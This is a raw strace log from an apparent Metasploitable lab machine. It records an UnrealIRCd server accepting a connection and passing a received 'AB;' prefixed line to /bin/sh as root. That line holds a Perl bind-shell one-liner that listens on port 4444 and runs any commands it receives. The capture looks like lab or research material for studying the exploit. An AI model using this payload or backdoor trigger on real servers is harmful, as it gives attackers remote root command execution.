4519  07:16:28.829566 select(1024, [2 3 4 7 9], [], NULL, {0, 960000}) = 1 (in [2], left {0, 770000})
4519  07:16:29.025989 clock_gettime(CLOCK_MONOTONIC, {1398, 843010949}) = 0
4519  07:16:29.026012 accept(2, 0, NULL) = 5
4519  07:16:29.026033 getpeername(5, {sa_family=AF_INET, sin_port=htons(40139), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:16:29.026104 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:16:29.026117 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:16:29.026145 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:16:29.026157 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:16:29.026169 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:16:29.026180 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:16:29.026194 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:16:29.026210 clock_gettime(CLOCK_MONOTONIC, {1398, 843224046}) = 0
4519  07:16:29.026222 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:16:29.026235 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:16:29.026244 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:16:29.026254 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:16:29.026264 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:16:29.026280 send(6, "u\272\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:16:29.026391 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:16:29.026414 gettimeofday({1495624589, 26419}, NULL) = 0
4519  07:16:29.026428 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:16:29.029720 clock_gettime(CLOCK_MONOTONIC, {1398, 846756113}) = 0
4519  07:16:29.029756 recvfrom(6, "u\272\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0L\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:16:29.029821 close(6)          = 0
4519  07:16:29.029836 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:16:29.029850 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:16:29.029908 time(NULL)        = 1495624589
4519  07:16:29.029920 time(NULL)        = 1495624589
4519  07:16:29.029933 gettimeofday({1495624589, 29937}, NULL) = 0
4519  07:16:29.029945 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:16:29.029973 clock_gettime(CLOCK_MONOTONIC, {1398, 846986579}) = 0
4519  07:16:29.029984 gettimeofday({1495624589, 29988}, NULL) = 0
4519  07:16:29.029995 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:16:29.030359 clock_gettime(CLOCK_MONOTONIC, {1398, 847373717}) = 0
4519  07:16:29.030373 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:16:29.030416 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:16:29.030435 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:16:29.030448 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:16:29.030463 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 6987
6987  07:16:29.030532 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
6987  07:16:29.030547 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
6987  07:16:29.030557 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6987  07:16:29.030571 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
6987  07:16:29.030689 brk(0)            = 0x80f9000
6987  07:16:29.030713 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.030729 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f67000
6987  07:16:29.030746 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.030769 open("/etc/ld.so.cache", O_RDONLY) = 1
6987  07:16:29.030786 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6987  07:16:29.030908 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f5f000
6987  07:16:29.030935 close(1)          = 0
6987  07:16:29.030946 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.030962 open("/lib/libncurses.so.5", O_RDONLY) = 1
6987  07:16:29.030975 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
6987  07:16:29.031070 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
6987  07:16:29.031088 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f2f000
6987  07:16:29.031100 mmap2(0xb7f5c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f5c000
6987  07:16:29.031117 close(1)          = 0
6987  07:16:29.031129 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.031143 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6987  07:16:29.031158 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6987  07:16:29.031248 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6987  07:16:29.031274 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f2b000
6987  07:16:29.031286 mmap2(0xb7f2d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f2d000
6987  07:16:29.031302 close(1)          = 0
6987  07:16:29.031313 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.031332 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6987  07:16:29.031346 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
6987  07:16:29.031435 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6987  07:16:29.031451 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2a000
6987  07:16:29.031465 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ddb000
6987  07:16:29.031476 mmap2(0xb7f24000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f24000
6987  07:16:29.031491 mmap2(0xb7f27000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f27000
6987  07:16:29.031505 close(1)          = 0
6987  07:16:29.031527 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dda000
6987  07:16:29.031540 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dda6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6987  07:16:29.031595 mprotect(0xb7f24000, 4096, PROT_READ) = 0
6987  07:16:29.031633 munmap(0xb7f5f000, 29913) = 0
6987  07:16:29.031658 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6987  07:16:29.031672 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
6987  07:16:29.031692 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe5b010) = -1 ENOTTY (Inappropriate ioctl for device)
6987  07:16:29.031723 brk(0)            = 0x80f9000
6987  07:16:29.031732 brk(0x80fa000)    = 0x80fa000
6987  07:16:29.031744 brk(0x80fb000)    = 0x80fb000
6987  07:16:29.031760 getuid32()        = 0
6987  07:16:29.031770 getgid32()        = 0
6987  07:16:29.031779 geteuid32()       = 0
6987  07:16:29.031788 getegid32()       = 0
6987  07:16:29.031843 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6987  07:16:29.031873 time(NULL)        = 1495624589
6987  07:16:29.031901 brk(0x80fc000)    = 0x80fc000
6987  07:16:29.031931 brk(0x80fd000)    = 0x80fd000
6987  07:16:29.031951 open("/proc/meminfo", O_RDONLY) = 1
6987  07:16:29.031973 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
6987  07:16:29.031991 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f66000
6987  07:16:29.032003 read(1, "MemTotal:      1035240 kB\nMemFree:        576604 kB\nBuffers:         64440 kB\nCached:         237764 kB\nSwapCached:          0 kB\nActive:         253540 kB\nInactive:       177624 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        576364 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5356 kB\nWriteback:           0 kB\nAnonPages:      129012 kB\nMapped:          51968 kB\nSlab:            16172 kB\nSReclaimable:     8036 kB\nSUnreclaim:       8136 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
6987  07:16:29.032089 close(1)          = 0
6987  07:16:29.032101 munmap(0xb7f66000, 4096) = 0
6987  07:16:29.032113 brk(0x80fe000)    = 0x80fe000
6987  07:16:29.032140 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6987  07:16:29.032153 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6987  07:16:29.032165 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6987  07:16:29.032177 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6987  07:16:29.032189 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
6987  07:16:29.032201 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
6987  07:16:29.032214 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6987  07:16:29.032226 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6987  07:16:29.032239 uname({sys="Linux", node="metasploitable", ...}) = 0
6987  07:16:29.032287 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6987  07:16:29.032316 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6987  07:16:29.032335 brk(0x8100000)    = 0x8100000
6987  07:16:29.032347 getcwd("/etc/unreal", 4096) = 12
6987  07:16:29.032362 getpid()          = 6987
6987  07:16:29.032378 getppid()         = 4519
6987  07:16:29.032394 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6987  07:16:29.032414 stat64("/sbin/sh", 0xbfe5afe8) = -1 ENOENT (No such file or directory)
6987  07:16:29.032427 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6987  07:16:29.032444 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6987  07:16:29.032468 socket(PF_FILE, SOCK_STREAM, 0) = 1
6987  07:16:29.032481 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6987  07:16:29.032492 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6987  07:16:29.032514 close(1)          = 0
6987  07:16:29.032526 socket(PF_FILE, SOCK_STREAM, 0) = 1
6987  07:16:29.032536 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6987  07:16:29.032546 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6987  07:16:29.032564 close(1)          = 0
6987  07:16:29.032578 open("/etc/nsswitch.conf", O_RDONLY) = 1
6987  07:16:29.032592 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6987  07:16:29.032608 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f66000
6987  07:16:29.032619 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6987  07:16:29.032669 read(1, "", 4096) = 0
6987  07:16:29.032678 close(1)          = 0
6987  07:16:29.032688 munmap(0xb7f66000, 4096) = 0
6987  07:16:29.032704 open("/etc/ld.so.cache", O_RDONLY) = 1
6987  07:16:29.032716 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6987  07:16:29.032733 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f5f000
6987  07:16:29.032743 close(1)          = 0
6987  07:16:29.032754 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.032768 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
6987  07:16:29.032783 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
6987  07:16:29.032884 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
6987  07:16:29.032902 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd1000
6987  07:16:29.032914 mmap2(0xb7dd8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7dd8000
6987  07:16:29.032931 close(1)          = 0
6987  07:16:29.032943 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.032957 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
6987  07:16:29.032971 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
6987  07:16:29.033058 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
6987  07:16:29.033075 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db9000
6987  07:16:29.033086 mmap2(0xb7dcd000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dcd000
6987  07:16:29.033101 mmap2(0xb7dcf000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dcf000
6987  07:16:29.033115 close(1)          = 0
6987  07:16:29.033141 munmap(0xb7f5f000, 29913) = 0
6987  07:16:29.033158 open("/etc/ld.so.cache", O_RDONLY) = 1
6987  07:16:29.033171 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6987  07:16:29.033187 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f5f000
6987  07:16:29.033197 close(1)          = 0
6987  07:16:29.033207 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.033222 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
6987  07:16:29.033236 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6987  07:16:29.033337 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
6987  07:16:29.033355 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7daf000
6987  07:16:29.033367 mmap2(0xb7db7000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7db7000
6987  07:16:29.033383 close(1)          = 0
6987  07:16:29.033395 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6987  07:16:29.033409 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
